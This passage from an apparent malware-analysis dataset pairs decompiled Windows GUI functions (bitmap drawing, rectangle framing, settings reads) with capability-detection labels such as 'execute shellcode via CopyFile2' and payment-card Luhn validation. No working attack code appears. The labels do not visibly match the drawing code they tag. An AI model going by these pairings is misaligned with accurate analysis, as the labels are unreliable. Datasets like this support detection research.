iStack360;\n    pcStack356 = *(param_1 + 0x88) + 1;\n    iStack328 = *(param_1 + 0x5c);\n    uStack332 = 1;\n    uStack336 = 0;\n    uStack340 = 0;\n    iStack344 = iStack300;\n    pcStack368 = 0x40738f;\n    iStack240 = pcStack356;\n    (*_sym.imp.GDI32.dll_StretchBlt)();\n    if ((*(param_1 + 0x108) != 0) && (*(param_1 + 0x104) != 0)) {\n        pcStack368 = &stack0xfffffefc;\n        puStack372 = &stack0xfffffef4;\n        puStack376 = &stack0xfffffee4;\n        puStack380 = 0x4073bd;\n        fcn.004065c0();\n        puStack380 = &stack0xfffffec0;\n        uStack384 = 0x18;\n        iStack388 = uStack332;\n        pcStack392 = 0x4073cf;\n        (*_sym.imp.GDI32.dll_GetObjectA)();\n        pcVar10 = _sym.imp.GDI32.dll_SetPixel;\n        pcStack392 = uStack308;\n        iStack396 = 0;\n        (*_sym.imp.GDI32.dll_SetPixel)(pcStack368, 0);\n        (*pcVar10)(uStack384, 0, 1, uStack308);\n        iVar3 = 2;\n        if (2 < iStack300) {\n            do {\n                pcStack368 = pcStack260;\n                puStack376 = NULL;\n                puStack380 = iStack344;\n                uStack384 = 0x407415;\n                puStack372 = iVar3;\n                (*_sym.imp.GDI32.dll_SetPixel)();\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < iStack300);\n        }\n    }\n    puStack372 = *(param_1 + 0x5c);\n    pcStack368 = 0xcc0020;\n    puStack376 = 0x1;\n    puStack380 = NULL;\n    uStack384 = 0;\n    iStack388 = iStack344;\n    pcStack392 = (*(param_1 + 0x90) - *(param_1 + 0x88)) + -1;\n    iStack396 = (*(param_1 + 0x60) / 2 + *piVar1) - iVar8;\n    puVar11 = puStack252;\n    (*_sym.imp.GDI32.dll_StretchBlt)(puStack252, iVar8, *(param_1 + 0x88) + 1);\n    if (puStack372 != NULL) {\n        fcn.00433b14(iStack388, *(puStack372 + 4));\n    }\n    if (iStack364 != 0) {\n        fcn.00433ab0();\n    }\n    iVar3 = param_1 + 0xec;\n    if (iVar3 != 0) {\n        iVar3 = *(param_1 + 0xf0);\n    }\n    iVar14 = iStack388;\n    iVar3 = fcn.00433b14(iStack388, iVar3);\n    piVar13 = param_1 + 0xa4;\n    iStack248 = *piVar13;\n    uStack244 = *(param_1 + 0xa8);\n    iStack240 = *(param_1 + 0xac);\n    if (*(param_1 + 0x124) != 0) {\n        (*_sym.imp.USER32.dll_OffsetRect)(&stack0xffffff08, 1, 1);\n    }\n    pcVar10 = _sym.imp.USER32.dll_FrameRect;\n    iVar9 = iStack328;\n    if (*(param_1 + 0x114) != 0) {\n        iStack360 = *piVar13;\n        pcStack356 = *(param_1 + 0xa8) + 1;\n        iStack352 = *(param_1 + 0xac) + -1;\n        iStack348 = *(param_1 + 0xb0) + -1;\n        (*_sym.imp.USER32.dll_FrameRect)(uStack304, &stack0xfffffe98, iStack364);\n        (*_sym.imp.USER32.dll_OffsetRect)(&stack0xfffffe8c, 1, 1);\n        piVar13 = &stack0xfffffe98;\n        iVar9 = iStack364;\n    }\n    uVar12 = uStack304;\n    (*pcVar10)(uStack304, piVar13, iVar9);\n    if (iVar3 != 0) {\n        fcn.00433b14(puVar11, *(iVar3 + 4));\n    }\n    if (*(param_1 + 0x70) == 0) {\n        *piVar1 = -1;\n        *(param_1 + 0x78) = 0xffffffff;\n        *(param_1 + 0x7c) = 0xffffffff;\n        *(param_1 + 0x80) = 0xffffffff;\n    }\n    else {\n        if ((*(param_1 + 0x110) == 0) && (iVar3 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar3 != *(param_1 + 0x1c))) {\n            iVar3 = param_1 + 0xd4;\n            if (iVar3 != 0) {\n                iVar3 = *(param_1 + 0xd8);\n            }\n        }\n        else {\n            iVar3 = param_1 + 0xdc;\n            if (iVar3 != 0) {\n                iVar3 = *(param_1 + 0xe0);\n            }\n        }\n        puVar15 = puVar11;\n        uVar4 = fcn.00433b14(puVar11, iVar3);\n        iVar3 = 0;\n        if (0 < *(param_1 + 0x60)) {\n            do {\n                if (0 < *(param_1 + 0x5c)) {\n                    iVar9 = 0;\n                    do {\n                        iVar5 = (*_sym.imp.GDI32.dll_GetPixel)(iVar14, iVar3, iVar9);\n                        iVar7 = iStack344;\n                        if (iVar5 == 0x30000) {\ncode_r0x00407606:\n                            uVar6 = (*_sym.imp.GDI32.dll_GetPixel)(uStack324, iVar7, iVar9);\n                            (*_sym.imp.GDI32.dll_SetPixel)(uVar12, iVar3, iVar9, uVar6);\n                        }\n                        else if (iVar5 == 0x40000) {\n                            iVar7 = iVar8 + -1;\n                            goto code_r0x00407606;\n                        }\n                        iVar9 = iVar9 + 1;\n                    } while (iVar9 < *(param_1 + 0x5c));\n                }\n                iVar3 = iVar3 + 1;\n            } while (iVar3 < *(param_1 + 0x60));\n        }\n        (*_sym.imp.GDI32.dll_StretchBlt)\n                  (uStack324, *piVar1, *(param_1 + 0x78), *(param_1 + 0x7c) - *piVar1, \n                   *(param_1 + 0x80) - *(param_1 + 0x78), iVar14, 0, 0, *(param_1 + 0x60), *(param_1 + 0x5c), 0xcc0020);\n        pcVar10 = _sym.imp.USER32.dll_FrameRect;\n        if ((*(param_1 + 0x104) == 0) &&\n           ((*(param_1 + 0x110) != 0 ||\n            (iVar3 = (*_sym.imp.USER32.dll_GetFocus)(),  pcVar10 = _sym.imp.USER32.dll_FrameRect, \n            iVar3 == *(param_1 + 0x1c))))) {\n            pcVar10 = _sym.imp.USER32.dll_FrameRect;\n            puStack372 = *piVar1 + 1;\n            pcStack368 = *(param_1 + 0x78) + 1;\n            iStack364 = *(param_1 + 0x7c) + -1;\n            puVar11 = &stack0xfffffe8c;\n            iStack360 = *(param_1 + 0x80) + -2;\n            (*_sym.imp.USER32.dll_FrameRect)(iStack316, puVar11, puStack376);\n            (*_sym.imp.USER32.dll_InflateRect)(&stack0xfffffe80, 0xffffffff, 0xffffffff);\n            (*pcVar10)(uStack340, &stack0xfffffe74, uVar4);\n        }\n        if (pcStack392 != NULL) {\n            fcn.00433b14(puVar11, *(pcStack392 + 4), puVar15);\n        }\n    }\n    (*pcVar10)(iStack316, iStack328, uStack340);\n    fcn.00433ab0();\n    fcn.004337da();\n    pcStack392 = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    pcStack356 = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    fcn.00406d50();\n    *in_FS_OFFSET = iStack240;\n    return;\n}\n",
        "token_count": 3997
    },
    "004077c0": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __fastcall fcn.004077c0(int32_t param_1)\n\n{\n    uint *puVar1;\n    code *pcVar2;\n    int32_t **ppiVar3;\n    uint uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    int32_t iVar7;\n    int32_t iVar8;\n    uint unaff_EDI;\n    int32_t iVar9;\n    code *pcVar10;\n    int32_t *in_FS_OFFSET;\n    int32_t iVar11;\n    uchar *in_stack_fffffe10;\n    int32_t iStack484;\n    uint uStack480;\n    int32_t iStack476;\n    code *pcStack472;\n    uint uStack468;\n    code *pcStack464;\n    int32_t iStack460;\n    int32_t iStack456;\n    int32_t iStack452;\n    int32_t iStack448;\n    int32_t *piStack444;\n    int32_t *piStack440;\n    int32_t *piStack436;\n    int32_t *piStack432;\n    code *pcStack428;\n    uchar *puStack424;\n    uint uStack420;\n    int32_t **ppiStack416;\n    uchar *puStack412;\n    uint *puStack408;\n    int32_t iStack404;\n    int32_t iStack400;\n    int32_t *piStack396;\n    uint uStack392;\n    uint uStack388;\n    uchar *puStack384;\n    uchar *puStack380;\n    uchar *puStack376;\n    uchar *puStack372;\n    int32_t iStack368;\n    int32_t iStack364;\n    int32_t iStack360;\n    int32_t iStack356;\n    int32_t iStack352;\n    uchar *puStack348;\n    uint uStack344;\n    int32_t iStack340;\n    uint uStack336;\n    int32_t iStack332;\n    uint uStack328;\n    uchar *puStack324;\n    int32_t iStack320;\n    int32_t iStack316;\n    int32_t iStack312;\n    int32_t iStack308;\n    uint uStack304;\n    uint uStack300;\n    uint uStack296;\n    uchar *puStack292;\n    int32_t iStack288;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint uStack272;\n    uchar *puStack268;\n    code *pcStack264;\n    uint uStack260;\n    uchar *puStack256;\n    int32_t iStack252;\n    uint uStack248;\n    int32_t iStack244;\n    uint uVar12;\n    uchar *puStack224;\n    int32_t *piStack220;\n    int32_t iStack200;\n    uint uStack196;\n    int32_t iStack192;\n    uint uStack188;\n    uint uStack168;\n    uint uStack160;\n    uint uStack136;\n    uchar *puStack124;\n    int32_t *piStack104;\n    uchar uStack92;\n    uint uStack84;\n    uint uStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar auStack28 [4];\n    uchar uStack24;\n    uint uStack20;\n    int32_t iStack12;\n    uint uStack8;\n    int32_t iStack4;\n    \n    iStack4 = -1;\n    uStack8 = 0x44b224;\n    iStack12 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xfffffff4;\n    piVar6 = param_1 + 0x84;\n    puStack224 = &stack0xffffffe4;\n    piStack220 = piVar6;\n    piStack104 = piVar6;\n    (*_sym.imp.USER32.dll_CopyRect)();\n    iVar9 = iStack4;\n    fcn.00406ab0();\n    uVar12 = 0x76554c;\n    uStack20 = 0;\n    fcn.00433fce(0x76554c);\n    uStack24 = 1;\n    iStack244 = 0x407847;\n    fcn.00433fce(*(param_1 + 0x100));\n    auStack28[0] = 2;\n    iStack244 = 0x407858;\n    fcn.0043307e();\n    auStack28[0] = 3;\n    if (iVar9 != 0) {\n        iVar9 = *(iVar9 + 4);\n    }\n    uStack248 = 0x40786e;\n    iStack244 = iVar9;\n    uStack248 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)();\n    iStack252 = 0x407878;\n    fcn.0043375c();\n    iStack252 = param_1 + 0xe4;\n    if (iStack252 != 0) {\n        iStack252 = *(param_1 + 0xe8);\n    }\n    puStack256 = puStack224;\n    uStack260 = 0x407890;\n    uVar4 = fcn.00433b14();\n    pcVar10 = _sym.imp.USER32.dll_OffsetRect;\n    puVar1 = param_1 + 0xb4;\n    uStack84 = *puVar1;\n    uStack80 = *(param_1 + 0xb8);\n    uStack76 = *(param_1 + 0xbc);\n    uStack72 = *(param_1 + 0xc0);\n    if (*(param_1 + 300) != 0) {\n        uStack260 = 1;\n        pcStack264 = 0x1;\n        puStack268 = &stack0xffffffac;\n        uStack272 = 0x4078e1;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n    }\n    if (*(param_1 + 0x11c) == 0) {\n        uStack260 = uStack168;\n        puStack268 = puStack124;\n        uStack272 = 0x407964;\n        pcStack264 = puVar1;\n        (*_sym.imp.USER32.dll_FrameRect)();\n    }\n    else {\n        uStack196 = *(param_1 + 0xb8);\n        iStack200 = *puVar1;\n        iStack192 = *(param_1 + 0xbc);\n        uStack260 = 0xffffffff;\n        uStack188 = *(param_1 + 0xc0);\n        pcStack264 = 0xffffffff;\n        puStack268 = &stack0xffffff38;\n        uStack272 = 0x407915;\n        (*_sym.imp.USER32.dll_InflateRect)();\n        uStack272 = unaff_EDI;\n        pcVar2 = _sym.imp.USER32.dll_FrameRect;\n        puStack276 = &stack0xffffff2c;\n        uStack280 = uStack136;\n        uStack284 = 0x40792f;\n        (*_sym.imp.USER32.dll_FrameRect)();\n        uStack284 = 1;\n        iStack288 = 1;\n        puStack292 = &stack0xffffff20;\n        uStack296 = 0x40793a;\n        (*pcVar10)();\n        uStack296 = uVar4;\n        uStack300 = &stack0xffffff14;\n        uStack304 = uStack160;\n        iStack308 = 0x40794e;\n        (*pcVar2)();\n    }\n    if (iStack288 != 0) {\n        iStack308 = *(iStack288 + 4);\n        iStack312 = uStack280;\n        iStack316 = 0x40797a;\n        fcn.00433b14();\n    }\n    iVar9 = *(param_1 + 0x5c);\n    iVar11 = *(param_1 + 0x88);\n    puStack268 = iVar9 + *(param_1 + 0x88);\n    iVar8 = *(param_1 + 0x90);\n    iVar5 = *piVar6;\n    *(param_1 + 0x74) = iVar5;\n    iVar7 = *(param_1 + 0x88) + *(param_1 + 0x58);\n    *(param_1 + 0x78) = iVar7;\n    *(param_1 + 0x7c) = (*(param_1 + 0x8c) - iVar5) + iVar5;\n    *(param_1 + 0x80) = iVar7 + iVar9;\n    uStack260 = 0;\n    pcStack264 = vtable.CBitmap.0;\n    uStack92 = 4;\n    iStack308 = 0x4079df;\n    iVar5 = fcn.00444bf8();\n    iStack312 = *(iVar5 + 0xc);\n    iStack308 = 0xd0;\n    iStack316 = 0x4079ee;\n    iStack316 = (*_sym.imp.USER32.dll_LoadBitmapA)();\n    iStack320 = 0x4079f8;\n    fcn.00433a59();\n    iStack320 = uStack272;\n    puStack324 = puStack292;\n    uStack328 = 0x407a07;\n    iStack308 = fcn.00433b14();\n    pcVar10 = _sym.imp.GDI32.dll_StretchBlt;\n    uStack328 = 0xcc0020;\n    iStack332 = 1;\n    iStack200 = iStack288 + (iVar9 * -2 - iVar11) + iVar8;\n    uStack336 = *(param_1 + 0x60);\n    iStack340 = 0;\n    iStack360 = *(param_1 + 0x5c) / 2 + *(param_1 + 0x78);\n    uStack344 = 0;\n    puStack348 = uStack300;\n    iStack352 = iStack200 - iStack360;\n    iStack356 = (*(param_1 + 0x8c) - *piVar6) + -1;\n    iStack364 = *piVar6 + 1;\n    iStack368 = iStack192;\n    puStack372 = 0x407a5b;\n    (*_sym.imp.GDI32.dll_StretchBlt)();\n    if ((*(param_1 + 0x108) != 0) && (*(param_1 + 0x104) != 0)) {\n        puStack372 = &stack0xfffffee0;\n        puStack376 = &stack0xffffff04;\n        puStack380 = &stack0xffffff08;\n        puStack384 = 0x407a8c;\n        fcn.004065c0();\n        puStack384 = &stack0xfffffebc;\n        uStack388 = 0x18;\n        uStack392 = uStack336;\n        piStack396 = 0x407a9e;\n        (*_sym.imp.GDI32.dll_GetObjectA)();\n        pcVar2 = _sym.imp.GDI32.dll_SetPixel;\n        piStack396 = uStack272;\n        iStack400 = 0;\n        iStack404 = 0;\n        puStack408 = iStack368;\n        puStack412 = 0x407ab4;\n        (*_sym.imp.GDI32.dll_SetPixel)();\n        puStack412 = puStack292;\n        ppiStack416 = NULL;\n        uStack420 = 1;\n        puStack424 = puStack384;\n        pcStack428 = 0x407ac4;\n        (*pcVar2)();\n        iVar9 = 2;\n        if (2 < iStack308) {\n            do {\n                puStack372 = iStack288;\n                puStack376 = NULL;\n                puStack384 = uStack344;\n                uStack388 = 0x407ae4;\n                puStack380 = iVar9;\n                (*_sym.imp.GDI32.dll_SetPixel)();\n                iVar9 = iVar9 + 1;\n            } while (iVar9 < iStack308);\n        }\n    }\n    puStack412 = uVar12;\n    puStack380 = *(param_1 + 0x60);\n    puStack372 = 0xcc0020;\n    puStack376 = 0x1;\n    puStack408 = *piVar6;\n    puStack384 = NULL;\n    piStack396 = (*(param_1 + 0x5c) / 2 + *(param_1 + 0x78)) - iStack332;\n    uStack388 = 0;\n    uStack392 = uStack344;\n    iStack400 = *(param_1 + 0x8c) - puStack408;\n    iStack404 = iStack332;\n    ppiStack416 = 0x407b2e;\n    (*pcVar10)();\n    if (piStack396 != NULL) {\n        ppiStack416 = piStack396[1];\n        uStack420 = uStack388;\n        puStack424 = 0x407b44;\n        fcn.00433b14();\n    }\n    if (iStack368 != 0) {\n        ppiStack416 = 0x407b55;\n        fcn.00433ab0();\n    }\n    ppiStack416 = param_1 + 0xec;\n    if (ppiStack416 != NULL) {\n        ppiStack416 = *(param_1 + 0xf0);\n    }\n    uStack420 = uStack388;\n    puStack424 = 0x407b6d;\n    iStack404 = fcn.00433b14();\n    pcStack472 = param_1 + 0xc4;\n    puStack324 = *pcStack472;\n    iStack320 = *(param_1 + 200);\n    iStack316 = *(param_1 + 0xcc);\n    iStack312 = *(param_1 + 0xd0);\n    if (*(param_1 + 0x130) != 0) {\n        puStack424 = 0x1;\n        pcStack428 = 0x1;\n        piStack432 = &stack0xfffffebc;\n        piStack436 = 0x407bad;\n        (*_sym.imp.USER32.dll_OffsetRect)();\n    }\n    iStack448 = iStack312 - iStack320;\n    puStack424 = 0xcc0020;\n    pcStack428 = *(param_1 + 0x5c);\n    piStack432 = *(param_1 + 0x60);\n    piStack436 = NULL;\n    piStack440 = NULL;\n    piStack444 = piStack396;\n    iStack452 = (iStack316 - puStack324) + -1;\n    iStack460 = puStack324;\n    pcStack464 = iStack288;\n    uStack468 = 0x407bf2;\n    iStack456 = iStack320;\n    iStack340 = iStack448;\n    (*_sym.imp.GDI32.dll_StretchBlt)();\n    pcVar10 = _sym.imp.USER32.dll_FrameRect;\n    if (*(param_1 + 0x120) == 0) {\n        uStack468 = puStack376;\n        iStack476 = iStack332;\n        uStack480 = 0x407c6d;\n        (*_sym.imp.USER32.dll_FrameRect)();\n        pcVar10 = _sym.imp.USER32.dll_FrameRect;\n    }\n    else {\n        iStack404 = *(param_1 + 200);\n        puStack408 = *pcStack472 + 1;\n        iStack400 = *(param_1 + 0xcc) + -1;\n        uStack468 = puStack412;\n        pcStack472 = &stack0xfffffe68;\n        piStack396 = *(param_1 + 0xd0) + -1;\n        iStack476 = iStack332;\n        uStack480 = 0x407c34;\n        (*_sym.imp.USER32.dll_FrameRect)();\n        uStack480 = 1;\n        iStack484 = 1;\n        (*_sym.imp.USER32.dll_OffsetRect)(&stack0xfffffe5c);\n        in_stack_fffffe10 = &stack0xfffffe50;\n        (*pcVar10)(iStack356, in_stack_fffffe10, piStack436);\n    }\n    if (iStack484 != 0) {\n        fcn.00433b14(iStack476, *(iStack484 + 4));\n    }\n    if (*(param_1 + 0x70) == 0) {\n        *puStack408 = 0xffffffff;\n        puStack408[1] = 0xffffffff;\n        puStack408[2] = 0xffffffff;\n        puStack408[3] = 0xffffffff;\n    }\n    else {\n        if ((*(param_1 + 0x110) == 0) && (iVar9 = (*_sym.imp.USER32.dll_GetFocus)(),  iVar9 != *(param_1 + 0x1c))) {\n            iVar9 = param_1 + 0xd4;\n            if (iVar9 != 0) {\n                iVar9 = *(param_1 + 0xd8);\n            }\n        }\n        else {\n            iVar9 = param_1 + 0xdc;\n            if (iVar9 != 0) {\n                iVar9 = *(param_1 + 0xe0);\n            }\n        }\n        iVar11 = iStack476;\n        fcn.00433b14(iStack476, iVar9);\n        pcVar10 = _sym.imp.GDI32.dll_GetPixel;\n        iVar9 = 0;\n        if (0 < *(param_1 + 0x60)) {\n            do {\n                iVar8 = 0;\n                if (0 < *(param_1 + 0x5c)) {\n                    do {\n                        iVar5 = (*pcVar10)(iStack484, iVar9, iVar8);\n                        piVar6 = pcStack472;\n                        if (iVar5 == 0x30000) {\ncode_r0x00407d22:\n                            uVar12 = (*pcVar10)(puStack376, iVar9, piVar6);\n                            (*_sym.imp.GDI32.dll_SetPixel)(in_stack_fffffe10, iVar9, iVar8, uVar12);\n                        }\n                        else if (iVar5 == 0x40000) {\n                            piVar6 = puStack384 + -1;\n                            goto code_r0x00407d22;\n                        }\n                        iVar8 = iVar8 + 1;\n                    } while (iVar8 < *(param_1 + 0x5c));\n                }\n                iVar9 = iVar9 + 1;\n                piVar6 = piStack396;\n            } while (iVar9 < *(param_1 + 0x60));\n        }\n        ppiVar3 = ppiStack416;\n        (*_sym.imp.GDI32.dll_StretchBlt)\n                  (puStack376, *ppiStack416, *(param_1 + 0x78), ppiStack416[2] - *ppiStack416, \n                   ppiStack416[3] - ppiStack416[1], iStack484, 0, 0, *(param_1 + 0x60), *(param_1 + 0x5c), 0xcc0020);\n        pcVar10 = _sym.imp.USER32.dll_FrameRect;\n        if ((*(param_1 + 0x104) == 0) &&\n           ((*(param_1 + 0x110) != 0 ||\n            (iVar9 = (*_sym.imp.USER32.dll_GetFocus)(),  pcVar10 = _sym.imp.USER32.dll_FrameRect, \n            iVar9 == *(param_1 + 0x1c))))) {\n            pcVar2 = _sym.imp.USER32.dll_InflateRect;\n            piStack440 = ppiVar3[1];\n            piStack444 = *ppiVar3;\n            piStack436 = ppiVar3[2];\n            piStack432 = ppiVar3[3];\n            iVar11 = -1;\n            (*_sym.imp.USER32.dll_InflateRect)(&stack0xfffffe44, 0xffffffff, 0xffffffff);\n            pcVar10 = _sym.imp.USER32.dll_FrameRect;\n            (*_sym.imp.USER32.dll_FrameRect)(puStack380, &stack0xfffffe38, iStack460);\n            (*pcVar2)(&stack0xfffffe2c, 0xffffffff, 0xffffffff);\n            (*pcVar10)(iStack404, &stack0xfffffe20, iStack484);\n        }\n        if (iStack484 != 0) {\n            fcn.00433b14(iVar11, *(iStack484 + 4), iStack476);\n        }\n    }\n    (*pcVar10)(iStack368, piVar6, puStack412);\n    uStack300._0_1_ = 3;\n    pcStack472 = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack300._0_1_ = 2;\n    fcn.004337da();\n    uStack300._0_1_ = 1;\n    pcStack464 = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack300 = uStack300._1_3_ << 8;\n    pcStack428 = vtable.CGdiObject.0;\n    fcn.00433ab0();\n    uStack300 = 0xffffffff;\n    fcn.00406d50();\n    *in_FS_OFFSET = iStack308;\n    return;\n}\n",
        "token_count": 4654
    },
    "0041d415": {
        "rules": [
            "execute shellcode via CopyFile2/5e26aed72a5343dd8575e85c80658d9d/1e72b327ed77488fa8075dcc8fba7738"
        ],
        "decompiled_code": "\nuint32_t fcn.0041d415(void)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint32_t uVar5;\n    uint32_t uVar6;\n    uint32_t uVar7;\n    uint32_t uVar8;\n    uint32_t uVar9;\n    uint32_t uVar10;\n    uint32_t uVar11;\n    uint32_t uVar12;\n    uint32_t uVar13;\n    uint32_t uVar14;\n    uint32_t uVar15;\n    uint32_t uVar16;\n    uint32_t uVar17;\n    uint32_t uVar18;\n    uint32_t uVar19;\n    uint32_t uVar20;\n    uint32_t uVar21;\n    uint32_t uVar22;\n    uint32_t uVar23;\n    uint32_t uVar24;\n    uint32_t uVar25;\n    uint32_t uVar26;\n    uint32_t uVar27;\n    uint32_t uVar28;\n    uint32_t uVar29;\n    uint32_t uVar30;\n    uint32_t uVar31;\n    uint32_t uVar32;\n    uint32_t uVar33;\n    uint32_t uVar34;\n    uint32_t uVar35;\n    uint32_t uVar36;\n    uint32_t uVar37;\n    uint32_t uVar38;\n    uint32_t uVar39;\n    uint32_t uVar40;\n    uint32_t uVar41;\n    uint32_t uVar42;\n    uint32_t uVar43;\n    uint32_t uVar44;\n    uint32_t arg_ch;\n    int32_t unaff_ESI;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = *0x46751a;\n    arg_ch = *0x46751c;\n    if (unaff_ESI == 0) {\n        return 0xffffffff;\n    }\n    uVar2 = fcn.004205de(1, uVar1, 0x31, unaff_ESI + 4);\n    uVar3 = fcn.004205de(1, uVar1, 0x32, unaff_ESI + 8);\n    uVar4 = fcn.004205de(1, uVar1, 0x33, unaff_ESI + 0xc);\n    uVar5 = fcn.004205de(1, uVar1, 0x34, unaff_ESI + 0x10);\n    uVar6 = fcn.004205de(1, uVar1, 0x35, unaff_ESI + 0x14);\n    uVar7 = fcn.004205de(1, uVar1, 0x36, unaff_ESI + 0x18);\n    uVar8 = fcn.004205de(1, uVar1, 0x37, unaff_ESI);\n    uVar9 = fcn.004205de(1, uVar1, 0x2a, unaff_ESI + 0x20);\n    uVar10 = fcn.004205de(1, uVar1, 0x2b, unaff_ESI + 0x24);\n    uVar11 = fcn.004205de(1, uVar1, 0x2c, unaff_ESI + 0x28);\n    uVar12 = fcn.004205de(1, uVar1, 0x2d, unaff_ESI + 0x2c);\n    uVar13 = fcn.004205de(1, uVar1, 0x2e, unaff_ESI + 0x30);\n    uVar14 = fcn.004205de(1, uVar1, 0x2f, unaff_ESI + 0x34);\n    uVar15 = fcn.004205de(1, uVar1, 0x30, unaff_ESI + 0x1c);\n    uVar16 = fcn.004205de(1, uVar1, 0x44, unaff_ESI + 0x38);\n    uVar17 = fcn.004205de(1, uVar1, 0x45, unaff_ESI + 0x3c);\n    uVar18 = fcn.004205de(1, uVar1, 0x46, unaff_ESI + 0x40);\n    uVar19 = fcn.004205de(1, uVar1, 0x47, unaff_ESI + 0x44);\n    uVar20 = fcn.004205de(1, uVar1, 0x48, unaff_ESI + 0x48);\n    uVar21 = fcn.004205de(1, uVar1, 0x49, unaff_ESI + 0x4c);\n    uVar22 = fcn.004205de(1, uVar1, 0x4a, unaff_ESI + 0x50);\n    uVar23 = fcn.004205de(1, uVar1, 0x4b, unaff_ESI + 0x54);\n    uVar24 = fcn.004205de(1, uVar1, 0x4c, unaff_ESI + 0x58);\n    uVar25 = fcn.004205de(1, uVar1, 0x4d, unaff_ESI + 0x5c);\n    uVar26 = fcn.004205de(1, uVar1, 0x4e, unaff_ESI + 0x60);\n    uVar27 = fcn.004205de(1, uVar1, 0x4f, unaff_ESI + 100);\n    uVar28 = fcn.004205de(1, uVar1, 0x38, unaff_ESI + 0x68);\n    uVar29 = fcn.004205de(1, uVar1, 0x39, unaff_ESI + 0x6c);\n    uVar30 = fcn.004205de(1, uVar1, 0x3a, unaff_ESI + 0x70);\n    uVar31 = fcn.004205de(1, uVar1, 0x3b, unaff_ESI + 0x74);\n    uVar32 = fcn.004205de(1, uVar1, 0x3c, unaff_ESI + 0x78);\n    uVar33 = fcn.004205de(1, uVar1, 0x3d, unaff_ESI + 0x7c);\n    uVar34 = fcn.004205de(1, uVar1, 0x3e, unaff_ESI + 0x80);\n    uVar35 = fcn.004205de(1, uVar1, 0x3f, unaff_ESI + 0x84);\n    uVar36 = fcn.004205de(1, uVar1, 0x40, unaff_ESI + 0x88);\n    uVar37 = fcn.004205de(1, uVar1, 0x41, unaff_ESI + 0x8c);\n    uVar38 = fcn.004205de(1, uVar1, 0x42, unaff_ESI + 0x90);\n    uVar39 = fcn.004205de(1, uVar1, 0x43, unaff_ESI + 0x94);\n    uVar40 = fcn.004205de(1, uVar1, 0x28, unaff_ESI + 0x98);\n    uVar1 = fcn.004205de(1, uVar1, 0x29, unaff_ESI + 0x9c);\n    uVar41 = fcn.004205de(1, arg_ch, 0x1f, unaff_ESI + 0xa0);\n    uVar42 = fcn.004205de(1, arg_ch, 0x20, unaff_ESI + 0xa4);\n    uVar43 = fcn.004205de(1, arg_ch, 0x1003, unaff_ESI + 0xa8);\n    uVar44 = fcn.004205de(0, arg_ch, 0x1009, unaff_ESI + 0xb0);\n    *(unaff_ESI + 0xac) = arg_ch;\n    return uVar2 | uVar3 | uVar4 | uVar5 | uVar6 | uVar7 | uVar8 | uVar9 | uVar10 | uVar11 | uVar12 | uVar13 | uVar14 |\n           uVar15 | uVar16 | uVar17 | uVar18 | uVar19 | uVar20 | uVar21 | uVar22 | uVar23 | uVar24 | uVar25 | uVar26 |\n           uVar27 | uVar28 | uVar29 | uVar30 | uVar31 | uVar32 | uVar33 | uVar34 | uVar35 | uVar36 | uVar37 | uVar38 |\n           uVar39 | uVar40 | uVar1 | uVar41 | uVar42 | uVar43 | uVar44;\n}\n",
        "token_count": 2103
    },
    "00407ef0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00407ef0(int32_t param_1)\n\n{\n    int32_t iVar1;\n    \n    if (*(param_1 + 0x13c) == 0) {\n        iVar1 = *(param_1 + 0x5c);\n        if ((*(param_1 + 0x90) - *(param_1 + 0x88)) - iVar1 < *(param_1 + 0x58) + iVar1) {\n            *(param_1 + 0x58) = (iVar1 * -2 - *(param_1 + 0x88)) + *(param_1 + 0x90);\n        }\n        iVar1 = iVar1 + *(param_1 + 0x88);\n        if (*(param_1 + 0x58) < iVar1) {\n            *(param_1 + 0x58) = iVar1;\n        }\n    }\n    else {\n        iVar1 = *(param_1 + 0x60);\n        if ((*(param_1 + 0x8c) - *(param_1 + 0x84)) - iVar1 < *(param_1 + 0x54) + iVar1) {\n            *(param_1 + 0x54) = (*(param_1 + 0x8c) + iVar1 * -2) - *(param_1 + 0x84);\n        }\n        iVar1 = iVar1 + *(param_1 + 0x84);\n        if (*(param_1 + 0x54) < iVar1) {\n            *(param_1 + 0x54) = iVar1;\n            return;\n        }\n    }\n    return;\n}\n",
        "token_count": 362
    },
    "00416b9d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55/f4adb04e51ec4c55be451936d9d27cc9",
            "validate payment card number using luhn algorithm with no lookup table/ddd7fbc99e2542de97c80e37351c10a7/a3d2ca57787b45ac887fefbb531cd56b",
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
